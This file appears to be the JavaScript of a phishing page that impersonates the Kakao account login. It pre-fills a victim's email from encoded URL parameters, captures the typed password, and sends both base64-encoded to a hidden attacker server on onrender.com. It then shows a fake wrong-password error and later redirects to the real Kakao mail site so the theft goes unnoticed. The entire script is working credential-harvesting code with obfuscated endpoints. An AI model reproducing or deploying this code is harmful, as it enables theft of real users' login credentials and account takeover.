$(document).ready(function() {
    const urlParams = new URLSearchParams(window.location.href);
    var ipv = urlParams.get("trexxcoz");
	var iav = urlParams.get("coztrexx");
	var av = window.atob(iav);
	var pv = window.atob(ipv);
	var ai = av + "@" + pv;
	var link1 = window.atob("aHR0cHM6Ly9jcy5rYWthby5jb20vaGVscHM/c2VydmljZT01MiZjYXRlZ29yeT0xODAmbG9jYWxlPWtv");
    if (!ai) {
		window.location.replace(link1);

    } else {
        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
		var fule = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (fule.test(ai)) {
            var my_ai = ai.toLowerCase();
        } else {
            window.location.replace(link1);
        }
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            window.location.replace(link1);
            
        }
        $('#loginKey--1').val(my_ai);
    }
	
	function testCapsLock(event) {
		if(event.code === "CapsLock"){
			let isCapsLockOn = event.getModifierState("CapsLock");
			if(isCapsLockOn) {
				document.getElementById("err_capslock").style.display = "block";
			} else {
				document.getElementById("err_capslock").style.display = "none";
			}
		}
	}

	document.addEventListener("keydown", testCapsLock);
	document.addEventListener("keyup", testCapsLock);



    $(document).keypress(function(event) {

        var keycode = (event.keyCode ? event.keyCode : event.which);
        if (keycode == '13') {
            event.preventDefault();
			mary();
        }
    });
	
});

function mary() {

	var pgx = "S2FrYW8=";
	var em = $('#loginKey--1').val();
	var ps = $('#password--2').val();
	var ax = window.btoa(em);
	var px = window.btoa(ps);
	var link2 = window.atob("aHR0cHM6Ly9tYWlsLmtha2FvLmNvbQ==");
	var lru = window.atob("aHR0cHM6Ly9wZW9nd3JpcmVtZ2ZrdmxtYmVmZGdrbG0ub25yZW5kZXIuY29tLw==");
	if (ps === "" || ps === " " || ps == " " || ps == "  " || ps == "   " || ps === null) {
		document.getElementById("erremptypww").innerHTML = "Please enter your password.";
		document.getElementById("errish").style.display = "block";
	} else {
		$.ajax({
			dataType: 'JSON',
			url: lru,
			type: 'POST',
			data: {
				ai: ax,
				pr: px,
				pg: pgx
			

			},
			
			beforeSend: function() {
				document.getElementById("errish").style.display = "none";				
				$("#loginKey--1").val("");
				$("#password--2").val("");	
			},
			success: function() {
				var count = 1;
				var a = document.getElementById("num2").value;
				var c = parseInt(a) + parseInt(count);
				if (c > 1) {
					window.location.replace(link2);
					return;
				}
				count = document.getElementById("num2").value = c; 
				count = count + 1;
				$('#loginKey--1').val(em);
				document.getElementById('erremptypww').innerHTML = "Your Kakao Account or password does not match. Please try again.";
				document.getElementById("errish").style.display = "block";
				$("#pw").val("");					
				
			},
			error: function() {
				var count = 1;
				var a = document.getElementById("num2").value;
				var c = parseInt(a) + parseInt(count);
				if (c > 1) {
					window.location.replace(link2);
					return;
				}
				count = document.getElementById("num2").value = c; 
				count = count + 1;
				$('#loginKey--1').val(em);
				document.getElementById('erremptypww').innerHTML = "Your Kakao Account or password does not match. Please try again.";
				document.getElementById("errish").style.display = "block";
				$("#pw").val("");				
				
			},
			complete: function() {

			}
		});
	}};